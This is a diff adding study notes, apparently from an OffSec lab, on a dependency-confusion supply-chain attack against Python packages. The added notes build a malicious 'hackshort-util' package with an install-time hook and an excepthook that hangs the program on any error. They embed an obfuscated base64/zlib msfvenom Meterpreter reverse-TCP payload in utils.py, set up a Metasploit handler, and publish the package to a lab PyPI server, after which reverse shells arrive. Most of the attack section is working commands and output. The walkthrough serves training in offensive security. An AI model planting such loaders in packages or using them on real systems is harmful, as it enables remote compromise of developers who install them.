@@ -772,37 +772,437 @@ kali@kali:~$ aws --profile backdoor iam list-attached-user-policies --user-name 
 
 ### Enumerating the Services
 
-
+_Poke around the website. Check Network tab of the developer settings, look at the headers._
 
 ### Conducting Open Source Intelligence
 
-
+_Search sites like Stack Overflow, Reddit, etc._
 
 ## Dependency Chain Attack
 
 ### Understanding the Attack
 
+<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption><p>Flow of Downloading When Public Repo does not Contain Package</p></figcaption></figure>
 
+<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption><p>Flow of Downloading when Public Repo does Contain Package</p></figcaption></figure>
 
 ### Creating Our Malicious Package
 
+Structure of a Python Package:
 
+```bash
+└── hackshort-util
+    ├── setup.py
+    └── hackshort_util
+        └── __init__.py
+```
+
+{% hint style="info" %}
+Instead of **setup.py**, we can also use **pyproject.toml** or **setup.cfg**.
+{% endhint %}
+
+Creating a basic Python Package:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ mkdir hackshort-util
+
+kali@kali:~$ cd hackshort-util           
+                                                                                                        
+kali@kali:~/hackshort-util$ nano setup.py
+
+kali@kali:~/hackshort-util$ cat -n setup.py
+01  from setuptools import setup, find_packages
+02
+03  setup(
+04      name='hackshort-util',
+05      version='1.1.4',
+06      packages=find_packages(),
+07      classifiers=[],
+08      install_requires=[],
+09      tests_require=[],
+10  )
+
+kali@kali:~/hackshort-util$ mkdir hackshort_util
+
+kali@kali:~/hackshort-util$ touch hackshort_util/__init__.py
+```
+{% endcode %}
+
+Running the newly created Python Package:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/hackshort-util$ python3 ./setup.py sdist
+running sdist
+running egg_info
+writing hackshort_util.egg-info/PKG-INFO
+writing dependency_links to hackshort_util.egg-info/dependency_links.txt
+writing top-level names to hackshort_util.egg-info/top_level.txt
+reading manifest file 'hackshort_util.egg-info/SOURCES.txt'
+writing manifest file 'hackshort_util.egg-info/SOURCES.txt'
+warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
+
+running check
+creating hackshort-util-1.1.4
+creating hackshort-util-1.1.4/hackshort_util
+creating hackshort-util-1.1.4/hackshort_util.egg-info
+copying files to hackshort-util-1.1.4...
+copying setup.py -> hackshort-util-1.1.4
+copying hackshort_util/__init__.py -> hackshort-util-1.1.4/hackshort_util
+copying hackshort_util/utils.py -> hackshort-util-1.1.4/hackshort_util
+copying hackshort_util.egg-info/PKG-INFO -> hackshort-util-1.1.4/hackshort_util.egg-info
+copying hackshort_util.egg-info/SOURCES.txt -> hackshort-util-1.1.4/hackshort_util.egg-info
+copying hackshort_util.egg-info/dependency_links.txt -> hackshort-util-1.1.4/hackshort_util.egg-info
+copying hackshort_util.egg-info/top_level.txt -> hackshort-util-1.1.4/hackshort_util.egg-info
+Writing hackshort-util-1.1.4/setup.cfg
+Creating tar archive
+removing 'hackshort-util-1.1.4' (and everything under it)
+```
+{% endcode %}
+
+Installing hackshort-util locally:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
+Defaulting to user installation because normal site-packages is not writeable
+Looking in indexes: http://pypi.offseclab.io, http://127.0.0.1
+Processing ./dist/hackshort-util-1.1.4.tar.gz
+  Preparing metadata (setup.py) ... done
+Building wheels for collected packages: hackshort-util
+  Building wheel for hackshort-util (setup.py) ... done
+  Created wheel for hackshort-util: filename=hackshort_util-1.1.4-py3-none-any.whl size=1188 sha256=2b00a9631c7fb9e1094b6c6ac70bd4424f1ecc3110e05dc89b6352229ed58f93
+  Stored in directory: /home/kali/.cache/pip/wheels/da/63/05/afd9e305b95f17a67a64eaa1e62f8acfd4fe458712853c2c3d
+Successfully built hackshort-util
+Installing collected packages: hackshort-util
+Successfully installed hackshort-util-1.1.4
+```
+{% endcode %}
+
+Importing and using hackshort\_util package:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ python3                                       
+Python 3.11.2 [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import hackshort_util
+>>> print(hackshort_util)
+<module 'hackshort_util' from '/home/kali/.local/lib/python3.11/site-packages/hackshort_util/__init__.py'>
+```
+{% endcode %}
+
+Uninstalling hackshort-util so we can reinstall with our updates:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/hackshort-util$ pip uninstall hackshort-util                   
+Found existing installation: hackshort-util 1.1.4
+Uninstalling hackshort-util-1.1.4:
+  Would remove:
+    /home/kali/.local/lib/python3.11/site-packages/hackshort_util-1.1.4.dist-info/*
+    /home/kali/.local/lib/python3.11/site-packages/hackshort_util/*
+Proceed (Y/n)? Y
+  Successfully uninstalled hackshort-util-1.1.4
+```
+{% endcode %}
 
 ### Command Execution During Install
 
+Adding custom code to run during install:
 
+{% code overflow="wrap" %}
+```python
+kali@kali:~/hackshort-util$ cat -n setup.py            
+01  from setuptools import setup, find_packages
+02  from setuptools.command.install import install
+03
+04  class Installer(install):
+05      def run(self):
+06          install.run(self)
+07          with open('/tmp/running_during_install', 'w') as f:
+08              f.write('This code was executed when the package was installed')
+09
+10  setup(
+11      name='hackshort-util',
+12      version='1.1.4',
+13      packages=find_packages(),
+14      classifiers=[],
+15      install_requires=[],
+16      tests_require=[],
+17      cmdclass={'install': Installer}
+18  )
+19
+```
+{% endcode %}
+
+Removing the existing package then building the new package:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/hackshort-util$ rm ./dist/hackshort-util-1.1.4.tar.gz
+
+kali@kali:~/hackshort-util$ cat /tmp/running_during_install   
+cat: /tmp/running_during_install: No such file or directory
+
+kali@kali:~/hackshort-util$ python3 ./setup.py sdist                      
+...
+```
+{% endcode %}
+
+Installing the new package and checking if custom code executed:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
+...
+
+kali@kali:~/hackshort-util$ cat /tmp/running_during_install           
+This code was executed when the package was installed 
+```
+{% endcode %}
 
 ### Command Execution During Runtime
 
+We know the developers we're targeting use the package by importing `utils` from `hackshort_utils`.
 
+Creating utils.py file with Exception Hook function:
+
+{% code overflow="wrap" %}
+```python
+kali@kali:~/hackshort-util$ nano hackshort_util/utils.py
+                                                                                                        
+kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
+01  import time
+02  import sys
+03
+04  def standardFunction():
+05          pass
+06
+07  def __getattr__(name):
+08          pass
+09          return standardFunction
+10
+11  def catch_exception(exc_type, exc_value, tb):
+12      while True:
+13          time.sleep(1000)
+14
+15  sys.excepthook = catch_exception
+```
+{% endcode %}
+
+Uninstalling, rebuilding, and reinstalling hackshort-util package:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/hackshort-util$ pip uninstall hackshort-util
+...
+
+kali@kali:~/hackshort-util$ python3 ./setup.py sdist
+...
+
+kali@kali:~/hackshort-util$ pip install ./dist/hackshort_util-1.1.4.tar.gz
+...
+```
+{% endcode %}
+
+Testing our newly created package:
+
+{% code overflow="wrap" %}
+```python
+kali@kali:~$ python3                 
+Python 3.11.2 [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from hackshort_util import utils
+>>> utils.run()
+>>> 1/0
+```
+{% endcode %}
 
 ### Adding a Payload
 
+Generating a python meterpreter payload:
 
+{% code overflow="wrap" %}
+```bash
+kali@kali:~$ msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.88.99.76 LPORT=4488
+[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
+[-] No arch selected, selecting arch: python from the payload
+No encoder specified, outputting raw payload
+Payload size: 436 bytes
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
+```
+{% endcode %}
+
+Modifying utils.py to add the generated payload:
+
+{% code overflow="wrap" %}
+```python
+kali@kali:~/hackshort-util$ nano hackshort_util/utils.py
+
+kali@kali:~/hackshort-util$ cat -n hackshort_util/utils.py
+01  import time
+02  import sys
+03
+04  def standardFunction():
+05          pass
+06
+07  def __getattr__(name):
+08          pass
+09          return standardFunction
+10
+11  def catch_exception(exc_type, exc_value, tb):
+12      while True:
+13          time.sleep(1000)
+14
+15  sys.excepthook = catch_exception
+16
+17  exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGMPuUrvtYgURDyIiuHsTWdp01NI0KZmsVsX/7oYsXmZ4b968+ejHyflA0ekBgvw2fSvbBqHIJQZ/0EGGfgTy6jydaW+pb+wb8OVCbEgW/NcxZlinZpUSX8kT3j7e3O+3u6fb6wcRdUo7a0EHztmyWqmyVFWl1gWTeV6WIkpaD81AMpg1TCF6x+EKDcDELwQxddpJHezU6IGzqzsmUXnQHzwX4nnxQrr6hI0gn++9AWrA8k5cmqNdd/ZfPU+0IDCD5vFs1YF24+QBkacPqLbII9lBVMofhmyDv4L8AerjXyE=')[0])))
+```
+{% endcode %}
+
+Logging into the cloud Kali instance via SSH:
+
+```bash
+kali@kali:~$ ssh kali@192.88.99.76
+The authenticity of host '192.88.99.76 (192.88.99.76)' can't be established.
+ED25519 key fingerprint is SHA256:uw2cM/UTH1lO2xSphPrIBa66w3XqioWiyrWRgHND/WI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.88.99.76' (ED25519) to the list of known hosts.
+kali@192.88.99.76's password: 
+
+kali@cloud-kali:~$
+```
+
+Initializing Metasploit's Database:
+
+```bash
+kali@cloud-kali:~$ sudo msfdb init
+[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf'
+[+] Creating databases 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
+[+] Creating initial database schema
+```
+
+Starting Metasploit and configuring the handler:
+
+{% code overflow="wrap" %}
+```bash
+kali@cloud-kali:~$ msfconsole
+....
+
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+
+msf6 exploit(multi/handler) > set payload python/meterpreter/reverse_tcp
+payload => python/meterpreter/reverse_tcp
+
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0
+LHOST => 0.0.0.0
+
+msf6 exploit(multi/handler) > set LPORT 4488
+LPORT => 4488
+
+msf6 exploit(multi/handler) > set ExitOnSession false
+ExitOnSession => false
+
+msf6 exploit(multi/handler) > run -jz
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+[*] Started reverse TCP handler on 0.0.0.0:4488
+```
+{% endcode %}
+
+Uninstalling, rebuilding, reinstalling, and importing the hackshort-util package:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/hackshort-util$ pip uninstall hackshort-util
+...
+
+kali@kali:~/hackshort-util$ python3 ./setup.py sdist
+...
+
+kali@kali:~/hackshort-util$ pip install ./dist/hackshort-util-1.1.4.tar.gz
+...
+
+kali@kali:~/hackshort-util$ python3
+Python 3.11.2 [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> from hackshort_util import utils
+>>>
+```
+{% endcode %}
+
+Capturing the reverse shell:
+
+```bash
+msf6 exploit(multi/handler) >
+[*] Sending stage (24772 bytes) to 233.252.50.125
+[*] Meterpreter session 1 opened (10.0.1.87:4488 -> 233.252.50.125:52342)
+```
+
+Closing the Meterpreter Session:
+
+```bash
+msf6 exploit(multi/handler) >
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > exit
+[*] Shutting down Meterpreter...
+
+[*] 233.252.50.125 - Meterpreter session 1 closed.  Reason: Died
+```
 
 ### Publishing Our Malicious Package
 
+Configuring \~/.pypirc file to add server URL and login credentials:
 
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/hackshort-util$ nano ~/.pypirc
+
+kali@kali:~/hackshort-util$ cat ~/.pypirc
+[distutils]
+index-servers = 
+    offseclab 
+
+[offseclab]
+repository: http://pypi.offseclab.io/
+username: student
+password: password 
+```
+{% endcode %}
+
+Uploading our malicious package to offseclab repository:
+
+{% code overflow="wrap" %}
+```bash
+kali@kali:~/hackshort-util$ python3 setup.py sdist upload -r offseclab              
+...
+Submitting dist/hackshort-util-1.1.4.tar.gz to http://pypi.offseclab.io/
+Server response (200): OK
+```
+{% endcode %}
+
+{% hint style="info" %}
+If a bad package was uploaded and we need to remove it, we can run the following command: curl -u "student:password" --form ":action=remove\_pkg" --form "name=hackshort-util" --form "version=1.1.4" http://pypi.offseclab.io/
+{% endhint %}
+
+Obtaining a reverse shell after publishing our malicious package to pypi.offseclab.io PyPI server:
+
+{% code overflow="wrap" %}
+```bash
+msf6 exploit(multi/handler) >
+[*] Sending stage (24772 bytes) to 44.211.221.172
+[*] Meterpreter session 2 opened (10.0.1.54:4488 -> 44.211.221.172:37604)
+```
+{% endcode %}
 
 ## Compromising the Environment
 
